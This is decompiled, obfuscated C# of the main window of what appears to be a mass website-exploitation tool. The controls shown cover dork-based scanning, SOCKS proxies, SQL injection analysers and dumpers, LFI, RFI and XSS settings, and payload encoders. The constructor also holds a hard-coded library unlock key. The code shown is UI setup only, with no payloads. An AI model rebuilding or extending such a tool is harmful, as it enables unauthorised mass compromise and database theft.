	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn8")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column18")]
	internal virtual DataGridViewTextBoxColumn Column18
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewImageColumn2")]
	internal virtual DataGridViewImageColumn DataGridViewImageColumn2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn4")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn5")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn7")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn9")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column17")]
	internal virtual DataGridViewTextBoxColumn Column17
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column6")]
	internal virtual DataGridViewImageColumn Column6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column7")]
	internal virtual DataGridViewTextBoxColumn Column7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column8")]
	internal virtual DataGridViewTextBoxColumn Column8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column9")]
	internal virtual DataGridViewTextBoxColumn Column9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column10")]
	internal virtual DataGridViewTextBoxColumn Column10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column11")]
	internal virtual DataGridViewTextBoxColumn Column11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column12")]
	internal virtual DataGridViewTextBoxColumn Column12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column13")]
	internal virtual DataGridViewTextBoxColumn Column13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column16")]
	internal virtual DataGridViewTextBoxColumn Column16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripStatusLabel lblIP
	{
		[CompilerGenerated]
		get
		{
			return _lblIP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_89;
			ToolStripStatusLabel toolStripStatusLabel = _lblIP;
			if (toolStripStatusLabel != null)
			{
				toolStripStatusLabel.DoubleClick -= value2;
			}
			_lblIP = value;
			toolStripStatusLabel = _lblIP;
			if (toolStripStatusLabel != null)
			{
				toolStripStatusLabel.DoubleClick += value2;
			}
		}
	}

	public static string dataAvailable
	{
		[CompilerGenerated]
		get
		{
			return string_1;
		}
		[CompilerGenerated]
		set
		{
			string_1 = value;
		}
	}

	public static string dataReady
	{
		[CompilerGenerated]
		get
		{
			return string_2;
		}
		[CompilerGenerated]
		set
		{
			string_2 = value;
		}
	}

	internal virtual TabControlExt mdiTabControl
	{
		[CompilerGenerated]
		get
		{
			return tabControlExt_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			TabControlExt.TabSelectedFormEventHandler value2 = method_54;
			TabControlExt tabControlExt = tabControlExt_0;
			if (tabControlExt != null)
			{
				tabControlExt.TabSelectedForm -= value2;
			}
			tabControlExt_0 = value;
			tabControlExt = tabControlExt_0;
			if (tabControlExt != null)
			{
				tabControlExt.TabSelectedForm += value2;
			}
		}
	}

	internal AppDomainControl AppDomainControl_0 => AppControlDomain;

	internal bool Boolean_0 => enum6_0 == Enum6.const_4;

	internal bool Boolean_1 => enum6_0 != Enum6.const_0;

	internal int Int32_0
	{
		get
		{
			if (threadPool_0 != null)
			{
				return threadPool_0.ThreadCount;
			}
			return 0;
		}
	}

	internal int Int32_1
	{
		get
		{
			if ((enum6_0 == Enum6.const_3) | (enum6_0 == Enum6.const_2) | (enum6_0 == Enum6.const_5))
			{
				return 0 - ((!bcWorker.CancellationPending) ? 1 : 0);
			}
			int result = default(int);
			return result;
		}
	}

	internal int Int32_2
	{
		get
		{
			if (enum6_0 == Enum6.const_1)
			{
				return 0 - ((!bcWorker.CancellationPending) ? 1 : 0);
			}
			int result = default(int);
			return result;
		}
	}

	public MainForm()
	{
		//IL_0219: Unknown result type (might be due to invalid IL or missing references)
		//IL_021f: Expected O, but got Unknown
		base.FormClosing += MainForm_FormClosing;
		base.Resize += MainForm_Resize;
		enum6_0 = Enum6.const_0;
		string_4 = "";
		toolStripLabel_1 = new ToolStripLabel();
		toolStripButton_3 = new ToolStripButton();
		toolStripButton_4 = new ToolStripButton();
		bool_4 = false;
		stopwatch_0 = Stopwatch.StartNew();
		method_8();
		if (!Directory.Exists(Globals.LNG_PATH))
		{
			Directory.CreateDirectory(Globals.LNG_PATH);
		}
		if (!File.Exists(Globals.LNG_PATH + "\\English.xml"))
		{
			File.WriteAllText(Globals.LNG_PATH + "\\English.xml", Class6.English);
		}
		Globals.translate_0 = new Translate();
		Class2.Class3_0.Splash_0.Show();
		Application.DoEvents();
		Class2.Class3_0.Splash_0.SetLoading("Initializing..");
		Versioned.CallByName(this, "smethod_9", CallType.Method);
		dataReady = Conversions.ToString(Versioned.CallByName(this, "smethod_7", CallType.Method));
		dataAvailable = "+4KPF1SVg2Jd3k/d36EZ281C";
		Versioned.CallByName(this, "InitializeComponent", CallType.Method);
		DLL_HTTP = (byte[])(object)"DUX4.dll";
		if (!Directory.Exists(Globals.TXT_PATH))
		{
			Directory.CreateDirectory(Globals.TXT_PATH);
		}
		if (!Directory.Exists(Globals.SCHEMA_PATH))
		{
			Directory.CreateDirectory(Globals.SCHEMA_PATH);
		}
		Class50.smethod_0();
		Globals.translate_0.SetLanguage(Class50.smethod_5(base.Name, cmbLanguages.Name, Globals.translate_0.OSLanguage()));
		Globals.translate_0.Add(this, icontainer_0);
		cmbLanguages.Items.AddRange(Globals.translate_0.GetLanguages().ToArray());
		cmbLanguages.Text = Globals.translate_0.GetLanguage();
		Versioned.CallByName(this, "smethod_0", CallType.Method);
		Versioned.CallByName(this, "smethod_1", CallType.Method);
		Global val = new Global();
		try
		{
			if (!val.UnlockBundle("fJmJcy.CB_1117HSn5SRdB"))
			{
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	public void InitializeComponent()
	{
		//IL_07e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f2: Expected O, but got Unknown
		//IL_75f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_7603: Expected O, but got Unknown
		this.icontainer_0 = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainForm));
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		this.stMain = new System.Windows.Forms.StatusStrip();
		this.lblMainStatus = new System.Windows.Forms.ToolStripStatusLabel();
		this.lblDownloads = new System.Windows.Forms.ToolStripStatusLabel();
		this.lblIP = new System.Windows.Forms.ToolStripStatusLabel();
		this.mnuListView = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuLWShell = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWClipboard = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWAlexa = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWSelectAll = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWSelectAllSP = new System.Windows.Forms.ToolStripSeparator();
		this.mnuLWGoNewDumper = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWGoDumper = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWGoFileDumper = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWGoNewDumperSP = new System.Windows.Forms.ToolStripSeparator();
		this.mnuLWReExploiter = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWExport = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWRemoveSP = new System.Windows.Forms.ToolStripSeparator();
		this.mnuLWTrash = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWRemove = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWAutoScrollSP = new System.Windows.Forms.ToolStripSeparator();
		this.mnuLWAutoScroll = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLWSelected = new System.Windows.Forms.ToolStripMenuItem();
		this.imgData = new System.Windows.Forms.ImageList(this.icontainer_0);
		this.mnuSocks = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuSocksCheck = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSocksUnCheck = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem5 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuSocksSelectAll = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSocksRemove = new System.Windows.Forms.ToolStripMenuItem();
		this.pnlAbout = new System.Windows.Forms.Panel();
		this.pnlSockList = new System.Windows.Forms.Panel();
		this.dtgSocks = new System.Windows.Forms.DataGridView();
		this.Column14 = new System.Windows.Forms.DataGridViewCheckBoxColumn();
		this.DataGridViewImageColumn3 = new System.Windows.Forms.DataGridViewImageColumn();
		this.DataGridViewTextBoxColumn10 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn11 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn12 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column15 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.tsSocks = new System.Windows.Forms.ToolStrip();
		this.lblSocksCount = new System.Windows.Forms.ToolStripLabel();
		this.btnSocksClear = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator15 = new System.Windows.Forms.ToolStripSeparator();
		this.btnSocksUrl = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator16 = new System.Windows.Forms.ToolStripSeparator();
		this.btnSocksAppend = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator17 = new System.Windows.Forms.ToolStripSeparator();
		this.btnSocksNew = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator14 = new System.Windows.Forms.ToolStripSeparator();
		this.btnSocksMyIP = new System.Windows.Forms.ToolStripButton();
		this.ToolStripLabel9 = new System.Windows.Forms.ToolStripLabel();
		this.btnSocksTest = new System.Windows.Forms.ToolStripButton();
		this.pnlSettings = new System.Windows.Forms.Panel();
		this.GroupBox2 = new System.Windows.Forms.GroupBox();
		this.prbImport = new System.Windows.Forms.ProgressBar();
		this.btnXmlImport8x = new System.Windows.Forms.Button();
		this.grbUpdater = new System.Windows.Forms.GroupBox();
		this.cmbUpdater = new System.Windows.Forms.ComboBox();
		this.chkUpdater = new System.Windows.Forms.CheckBox();
		this.btnUpdater = new System.Windows.Forms.Button();
		this.grbAppSetthings = new System.Windows.Forms.GroupBox();
		this.btnSettingSave = new System.Windows.Forms.Button();
		this.btnSettingReLoad = new System.Windows.Forms.Button();
		this.btnSettingReset = new System.Windows.Forms.Button();
		this.GroupBox4 = new System.Windows.Forms.GroupBox();
		this.lblGuiStyle = new System.Windows.Forms.Label();
		this.cmbGuiStyle = new System.Windows.Forms.ComboBox();
		this.lblLanguage = new System.Windows.Forms.Label();
		this.cmbLanguages = new System.Windows.Forms.ComboBox();
		this.cmbGUIHotKey = new System.Windows.Forms.ComboBox();
		this.btnSkinN = new System.Windows.Forms.Button();
		this.btnSkinP = new System.Windows.Forms.Button();
		this.cmbSkin = new System.Windows.Forms.ComboBox();
		this.chkSkin = new System.Windows.Forms.CheckBox();
		this.chkGUIHotKey = new System.Windows.Forms.CheckBox();
		this.chkSysTray = new System.Windows.Forms.CheckBox();
		this.grbExploithing = new System.Windows.Forms.GroupBox();
		this.lstExpoitType = new System.Windows.Forms.CheckedListBox();
		this.GroupBox1 = new System.Windows.Forms.GroupBox();
		this.chkScanningBlackListProxy = new System.Windows.Forms.CheckBox();
		this.txtAccept = new System.Windows.Forms.TextBox();
		this.txtUserAgent = new System.Windows.Forms.TextBox();
		this.lblHTTPdelay = new System.Windows.Forms.Label();
		this.numExploitingDelay = new System.Windows.Forms.NumericUpDown();
		this.numHTTPTimeout = new System.Windows.Forms.NumericUpDown();
		this.lblHTTPretry = new System.Windows.Forms.Label();
		this.numHTTPRetry = new System.Windows.Forms.NumericUpDown();
		this.lblHTTPtimeout = new System.Windows.Forms.Label();
		this.numScanningDelay = new System.Windows.Forms.NumericUpDown();
		this.lblHTTPdelayIP = new System.Windows.Forms.Label();
		this.lblAccept = new System.Windows.Forms.Label();
		this.lblUserAgent = new System.Windows.Forms.Label();
		this.btnExcludeUrlWords = new System.Windows.Forms.Button();
		this.lstExcludeUrlWords = new System.Windows.Forms.ListBox();
		this.mnuExcludeUrlWords = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuExcludeUrlWordsRemove = new System.Windows.Forms.ToolStripMenuItem();
		this.txtExcludeUrlWords = new System.Windows.Forms.TextBox();
		this.lblSkipWordURL = new System.Windows.Forms.Label();
		this.lblLFIPathCount = new System.Windows.Forms.Label();
		this.bcWorker = new System.ComponentModel.BackgroundWorker();
		this.pnlNotepad = new System.Windows.Forms.Panel();
		this.txtNotepad = new System.Windows.Forms.TextBox();
		this.mnuAbout = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuAboutClipboard = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuAboutHWID = new System.Windows.Forms.ToolStripMenuItem();
		this.pnlScanner = new System.Windows.Forms.Panel();
		this.grbScannerURL = new System.Windows.Forms.GroupBox();
		this.dtgQueue = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.tsSearchFilter = new System.Windows.Forms.ToolStrip();
		this.txtSearchFilter = new System.Windows.Forms.ToolStripComboBox();
		this.btnSearchFilter = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator9 = new System.Windows.Forms.ToolStripSeparator();
		this.chkHideDork = new System.Windows.Forms.ToolStripButton();
		this.grbDorks = new System.Windows.Forms.GroupBox();
		this.lblSearchSummary_1 = new System.Windows.Forms.Label();
		this.lblSearchSummary_2 = new System.Windows.Forms.Label();
		this.txtMultiDorks = new System.Windows.Forms.TextBox();
		this.lstSearchEngine = new System.Windows.Forms.CheckedListBox();
		this.mnuQueue = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuQueueShell = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuQueueClipboard = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuQueueSP3 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuQueueSelectAll = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuQueueSP1 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuQueueAddURLs = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuQueueSP2 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuQueueTrash = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuQueueRomove = new System.Windows.Forms.ToolStripMenuItem();
		this.pnlExploiter = new System.Windows.Forms.Panel();
		this.dtgFileInclusao = new System.Windows.Forms.DataGridView();
		this.DataGridViewImageColumn1 = new System.Windows.Forms.DataGridViewImageColumn();
		this.DataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn8 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column18 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.tsFileInclusao = new System.Windows.Forms.ToolStrip();
		this.cmbFileInclusaoFilter = new System.Windows.Forms.ToolStripComboBox();
		this.cmbFileInclusaoSearch = new System.Windows.Forms.ToolStripComboBox();
		this.btnFileInclusaoSearchClear = new System.Windows.Forms.ToolStripButton();
		this.txtFileInclusaoSearch = new System.Windows.Forms.ToolStripComboBox();
		this.btnFileInclusaoSearch = new System.Windows.Forms.ToolStripButton();
		this.lblSQLiNoInjectCount = new System.Windows.Forms.ToolStripSeparator();
		this.lblFileInclusao = new System.Windows.Forms.ToolStripLabel();
		this.pnlTrash = new System.Windows.Forms.Panel();
		this.dtgTrash = new System.Windows.Forms.DataGridView();
		this.DataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.mnuTrash = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuTrashRefresh = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuTrashClippboard = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuTrashSelectAll = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator8 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuTrashClearAll = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator10 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuTrashRemove = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator11 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuTrashCount = new System.Windows.Forms.ToolStripMenuItem();
		this.pnlWindows = new System.Windows.Forms.Panel();
		this.pnlControls = new System.Windows.Forms.Panel();
		this.grbHttpLog = new System.Windows.Forms.Panel();
		this.lvwHttpLog = new System.Windows.Forms.DataGridView();
		this.DataGridViewTextBoxColumn_0 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.clURL = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ProxyIP = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.mnuHttpLog = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuHttpLogClear = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuHttpLogShell = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuHttpLogClipboard = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuHttpLogAutoScroll = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuHttpLogDock = new System.Windows.Forms.ToolStripMenuItem();
		this.VisualStyler1 = new VisualStyler(this.icontainer_0);
		this.pnlSettingsAdvanced = new System.Windows.Forms.Panel();
		this.grbXSS = new System.Windows.Forms.GroupBox();
		this.lvwXSS = new ListViewExt();
		this.ColumnHeader36 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader37 = new System.Windows.Forms.ColumnHeader();
		this.mnuPaths = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuPathAdd = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuPathEdit = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuPathRem = new System.Windows.Forms.ToolStripMenuItem();
		this.grbLfiLinux = new System.Windows.Forms.GroupBox();
		this.tabFileInc = new UxTabControl();
		this.TabPage6 = new System.Windows.Forms.TabPage();
		this.numLFIpathTraversalCount = new System.Windows.Forms.NumericUpDown();
		this.lvwLFIpathLinux = new ListViewExt();
		this.ColumnHeader5 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader7 = new System.Windows.Forms.ColumnHeader();
		this.tpLfiWin = new System.Windows.Forms.TabPage();
		this.lvwLFIpathWin = new ListViewExt();
		this.ColumnHeader8 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader9 = new System.Windows.Forms.ColumnHeader();
		this.grbSQLi = new System.Windows.Forms.GroupBox();
		this.tabSQLi = new UxTabControl();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.chkAnalizeMsAcessSybase = new System.Windows.Forms.CheckBox();
		this.chkAnalizerPostgreErrorUnion = new System.Windows.Forms.CheckBox();
		this.chkAnalizerOracleErrorUnion = new System.Windows.Forms.CheckBox();
		this.txtAnalizerExploitCode = new System.Windows.Forms.TextBox();
		this.chkAnalizerMySQLErrorUnion = new System.Windows.Forms.CheckBox();
		this.numAnalizerUnionEnd = new System.Windows.Forms.NumericUpDown();
		this.chkAnalizerMSSQLErrorUnion = new System.Windows.Forms.CheckBox();
		this.chkAnalizeWAF = new System.Windows.Forms.CheckBox();
		this.numAnalizerUnionSart = new System.Windows.Forms.NumericUpDown();
		this.lblSQLiExploitCode = new System.Windows.Forms.Label();
		this.lblSQLiUnionCount = new System.Windows.Forms.Label();
		this.lblSQLiUnionTo = new System.Windows.Forms.Label();
		this.chkAnalizeMySQLReadWrite = new System.Windows.Forms.CheckBox();
		this.TabPage2 = new System.Windows.Forms.TabPage();
		this.lstAnalizerUnion = new System.Windows.Forms.CheckedListBox();
		this.TabPage3 = new System.Windows.Forms.TabPage();
		this.lstAnalizerError = new System.Windows.Forms.CheckedListBox();
		this.grbHTTPExploit = new System.Windows.Forms.GroupBox();
		this.chkSkipHttpStatus4xx = new System.Windows.Forms.CheckBox();
		this.chkExploitIgnoreCookies = new System.Windows.Forms.CheckBox();
		this.chkLfiWindowsSkip = new System.Windows.Forms.CheckBox();
		this.grbFileIncWAFs = new System.Windows.Forms.GroupBox();
		this.lvwWafs = new ListViewExt();
		this.ColumnHeader11 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader12 = new System.Windows.Forms.ColumnHeader();
		this.lblAdvanced = new System.Windows.Forms.Label();
		this.grbRFI = new System.Windows.Forms.GroupBox();
		this.txtRFIkeyword = new System.Windows.Forms.TextBox();
		this.txtRFIurl = new System.Windows.Forms.TextBox();
		this.lblRFIkeyword = new System.Windows.Forms.Label();
		this.lblRFIurl = new System.Windows.Forms.Label();
		this.grbScanner = new System.Windows.Forms.GroupBox();
		this.tabScanner = new UxTabControl();
		this.TabPage4 = new System.Windows.Forms.TabPage();
		this.lvwScannerDomain = new ListViewExt();
		this.ColumnHeader32 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader33 = new System.Windows.Forms.ColumnHeader();
		this.mnuScannerDomain = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.ScannerDomainEdit = new System.Windows.Forms.ToolStripMenuItem();
		this.TabPage5 = new System.Windows.Forms.TabPage();
		this.ntfTray = new System.Windows.Forms.NotifyIcon(this.icontainer_0);
		this.numThreads = new System.Windows.Forms.NumericUpDown();
		this.tsWorker = new System.Windows.Forms.ToolStrip();
		this.btnStart = new System.Windows.Forms.ToolStripButton();
		this.btnPause = new System.Windows.Forms.ToolStripButton();
		this.btnPauseSP = new System.Windows.Forms.ToolStripSeparator();
		this.btnStop = new System.Windows.Forms.ToolStripButton();
		this.prbMainStatus = new System.Windows.Forms.ToolStripProgressBar();
		this.pnlSQLi = new System.Windows.Forms.Panel();
		this.dtgSQLi = new System.Windows.Forms.DataGridView();
		this.Column6 = new System.Windows.Forms.DataGridViewImageColumn();
		this.Column7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column8 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column10 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column11 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column12 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column13 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column16 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.tsSearchColumn = new System.Windows.Forms.ToolStrip();
		this.btnSearchColumnStart = new System.Windows.Forms.ToolStripButton();
		this.cmbSearchColumnType = new System.Windows.Forms.ToolStripComboBox();
		this.ToolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
		this.chkSearchColumn = new System.Windows.Forms.ToolStripButton();
		this.cmbSearchColumn = new System.Windows.Forms.ToolStripComboBox();
		this.chkSearchColumn2 = new System.Windows.Forms.ToolStripButton();
		this.cmbSearchColumn2 = new System.Windows.Forms.ToolStripComboBox();
		this.chkSearchColumn3 = new System.Windows.Forms.ToolStripButton();
		this.cmbSearchColumn3 = new System.Windows.Forms.ToolStripComboBox();
		this.chkSearchColumn4 = new System.Windows.Forms.ToolStripButton();
		this.cmbSearchColumn4 = new System.Windows.Forms.ToolStripComboBox();
		this.ToolStripSeparator21 = new System.Windows.Forms.ToolStripSeparator();
		this.chkSearchColumnAllDBs = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator18 = new System.Windows.Forms.ToolStripSeparator();
		this.lblSearchColumnThreads = new System.Windows.Forms.ToolStripLabel();
		this.btnSearchColumnPause = new System.Windows.Forms.ToolStripButton();
		this.btnSearchColumnSP = new System.Windows.Forms.ToolStripSeparator();
		this.btnSearchColumnStop = new System.Windows.Forms.ToolStripButton();
		this.prbSearchColumn = new System.Windows.Forms.ToolStripProgressBar();
		this.tsSQLi = new System.Windows.Forms.ToolStrip();
		this.cmbSQLiFilter = new System.Windows.Forms.ToolStripComboBox();
		this.cmbSQLiSearch = new System.Windows.Forms.ToolStripComboBox();
		this.btnSQLiSearchClear = new System.Windows.Forms.ToolStripButton();
		this.txtSQLiSearch = new System.Windows.Forms.ToolStripComboBox();
		this.btnSQLiSearch = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator12 = new System.Windows.Forms.ToolStripSeparator();
		this.lblSQLi = new System.Windows.Forms.ToolStripLabel();
		this.mnuSearchColumn = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuSearchColumnRem = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSearchColumnClear = new System.Windows.Forms.ToolStripMenuItem();
		this.pnlSQLiNoInjectable = new System.Windows.Forms.Panel();
		this.dtgSQLiNoInjectable = new System.Windows.Forms.DataGridView();
		this.DataGridViewImageColumn2 = new System.Windows.Forms.DataGridViewImageColumn();
		this.DataGridViewTextBoxColumn4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column17 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.tsSQLiNoInjectable = new System.Windows.Forms.ToolStrip();
		this.cmbSQLiNoInjectableFilter = new System.Windows.Forms.ToolStripComboBox();
		this.cmbSQLiNoInjectableSearch = new System.Windows.Forms.ToolStripComboBox();
		this.btnSQLiNoInjectableSearchClear = new System.Windows.Forms.ToolStripButton();
		this.txtSQLiNoInjectableSearch = new System.Windows.Forms.ToolStripComboBox();
		this.btnSQLiNoInjectableSearch = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator13 = new System.Windows.Forms.ToolStripSeparator();
		this.lblSQLiNoInjectable = new System.Windows.Forms.ToolStripLabel();
		this.pnlSQLiDumper = new System.Windows.Forms.Panel();
		this.mnuDownloads = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuDownloadsClear = new System.Windows.Forms.ToolStripMenuItem();
		this.pnlTools = new System.Windows.Forms.Panel();
		this.btnToolsClean = new System.Windows.Forms.Button();
		this.grbToolsConvertEnc = new System.Windows.Forms.GroupBox();
		this.btnBase64ToText = new System.Windows.Forms.Button();
		this.btnTextToBase64 = new System.Windows.Forms.Button();
		this.btnURLDecondingToText = new System.Windows.Forms.Button();
		this.btnTextToURLEnconding = new System.Windows.Forms.Button();
		this.txtTextValue = new System.Windows.Forms.TextBox();
		this.cmbSQLChar = new System.Windows.Forms.ComboBox();
		this.butTextToSQLChar = new System.Windows.Forms.Button();
		this.txtSQLCharDelimiter = new System.Windows.Forms.TextBox();
		this.chkGroupChar = new System.Windows.Forms.CheckBox();
		this.btnHexToText = new System.Windows.Forms.Button();
		this.txtSQLCharValue = new System.Windows.Forms.TextBox();
		this.lblToolsConvertHexValue = new System.Windows.Forms.Label();
		this.lblToolsConverSQLChar = new System.Windows.Forms.Label();
		this.txtHexValue = new System.Windows.Forms.TextBox();
